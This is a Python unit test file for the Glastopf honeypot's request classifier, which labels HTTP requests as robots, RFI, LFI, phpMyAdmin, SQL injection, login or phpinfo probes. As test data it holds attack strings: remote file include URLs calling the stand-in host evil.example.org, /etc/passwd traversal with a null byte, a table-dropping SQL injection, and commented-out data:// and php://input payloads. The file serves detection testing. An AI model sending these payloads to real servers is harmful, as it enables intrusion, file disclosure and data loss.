#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import unittest

from glastopf.modules.HTTP.util import HTTPRequest
import glastopf.modules.classification.request as request_classifier


class TestClassifier(unittest.TestCase):
    """Test the behaviour of the Classifier class based on the rules
    defined into the requests.xml to detect the attack pattern
    """

    def setUp(self):
        self.requestClassifier = request_classifier.Classifier()


    def test_robots_classifier(self):
        """Objective: Test classifier for robots.txt requests
        Input: HTTPRequest with an robots.txt GET request
        Expected Response: matched pattern to robots
        Note: """

        parsed_request = HTTPRequest()
        parsed_request.method = 'GET'
        parsed_request.url = '/robots.txt'
        parsed_request.version = 'HTTP/1.0'
        
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'robots')

    def test_rfi_classifier(self):
        """Objective: Test classifier for RFI requests
        Input: HTTPRequest with different kind of remote file includes attempts
        Expected Response: matched pattern to rfi
        Note: """

        parsed_request = HTTPRequest()
        parsed_request.method = 'GET'
        parsed_request.url = '/index.php?file=http://evil.example.org/t.txt?'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'rfi')

        parsed_request.method = 'GET'
        parsed_request.url = '/index.php?file= http://evil.example.org/t.txt?'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'rfi')

        parsed_request.method = 'GET'
        parsed_request.url = '/index.php?file=https://evil.example.org/t.txt?'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'rfi')

        parsed_request.method = 'GET'
        parsed_request.url = '/index.php?file=ftp://evil.example.org/t.txt?'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'rfi')

        parsed_request.method = 'GET'
        parsed_request.url = '/index.php?file=ftps://evil.example.org/t.txt?'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'rfi')

        # TODO enable the tests below when the rfi module can handle such kind of attacks
        #parsed_request.method = 'GET'
        #parsed_request.url = '/index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4='
        #parsed_request.version = 'HTTP/1.0'
        #matched_pattern = self.requestClassifier.classify_request(parsed_request)
        #self.assertTrue(matched_pattern == 'rfi')


        #parsed_request.method = 'GET'
        #parsed_request.url = '/index.php?file= data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4='
        #parsed_request.version = 'HTTP/1.0'
        #matched_pattern = self.requestClassifier.classify_request(parsed_request)
        #self.assertTrue(matched_pattern == 'rfi')


        #parsed_request.method = 'GET'
        #parsed_request.url = 'index,php?file=php://input'
        #parsed_request.version = 'HTTP/1.0'
        #matched_pattern = self.requestClassifier.classify_request(parsed_request)
        #self.assertTrue(matched_pattern == 'rfi')

    def test_lfi_classifier(self):
        """Objective: Test classifier for LFI requests
        Input: HTTPRequest with different kind of local file includes attempts
        Expected Response: matched pattern to rfi
        Note: """

        parsed_request = HTTPRequest()
        parsed_request.method = 'GET'
        parsed_request.url = '/index.php?file=../../../../../../etc/passwd'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'lfi')

        parsed_request = HTTPRequest()
        parsed_request.method = 'GET'
        parsed_request.url = '/index.php?file=../../../../../../etc/passwd%00'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'lfi')


    def test_phpmyadmin_classifier(self):
        """Objective: Test classifier for phpmyadmin requests
        Input: HTTPRequest with a generic reference to phpmyadmin paths
        Expected Response: matched pattern to phpmyadmin
        Note: """

        parsed_request = HTTPRequest()
        parsed_request.method = 'GET'
        parsed_request.url = '/phpmyadmin/'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'phpmyadmin')

        parsed_request = HTTPRequest()
        parsed_request.method = 'GET'
        parsed_request.url = '/phpMyadmin/'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'phpmyadmin')

        parsed_request = HTTPRequest()
        parsed_request.method = 'GET'
        parsed_request.url = '/pma/'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'phpmyadmin')

        parsed_request = HTTPRequest()
        parsed_request.method = 'GET'
        parsed_request.url = '/PMA/'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'phpmyadmin')

        parsed_request = HTTPRequest()
        parsed_request.method = 'GET'
        parsed_request.url = '/phpMyAdmin-2.8.2/'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'phpmyadmin')

    def test_sqli_classifier(self):
        """Objective: Test classifier for SQL Injection requests
        Input: HTTPRequest with a generic sql injection attempt
        Expected Response: matched pattern to sqli
        Note: """

        parsed_request = HTTPRequest()
        parsed_request.method = 'GET'
        parsed_request.url = '/index.php?id=" or 1; drop talble users;--'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'sqli')

    def test_login_classifier(self):
        """Objective: Test classifier for login requests
        Input: HTTPRequest with a generic authentication login attempt
        Expected Response: matched pattern to login
        Note: """

        parsed_request = HTTPRequest()
        parsed_request.method = 'POST'
        parsed_request.url = '/login'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'login')

    def test_phpinfo_classifier(self):
        """Objective: Test classifier for phpinfo debug/test requests
        Input: HTTPRequest with an attempt to discover a generic phpinfo test page
        Expected Response: matched pattern to phpinfo
        Note: """

        parsed_request = HTTPRequest()
        parsed_request.method = 'POST'
        parsed_request.url = '/phpinfo.php?ss'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'phpinfo')

        parsed_request = HTTPRequest()
        parsed_request.method = 'POST'
        parsed_request.url = '/phpinfo.php'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'phpinfo')

        parsed_request = HTTPRequest()
        parsed_request.method = 'POST'
        parsed_request.url = '/info.php'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'phpinfo')

        parsed_request = HTTPRequest()
        parsed_request.method = 'POST'
        parsed_request.url = '/info.php?page'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'phpinfo')

        parsed_request = HTTPRequest()
        parsed_request.method = 'POST'
        parsed_request.url = '/phpinfo.html'
        parsed_request.version = 'HTTP/1.0'
        matched_pattern = self.requestClassifier.classify_request(parsed_request)
        self.assertTrue(matched_pattern == 'phpinfo')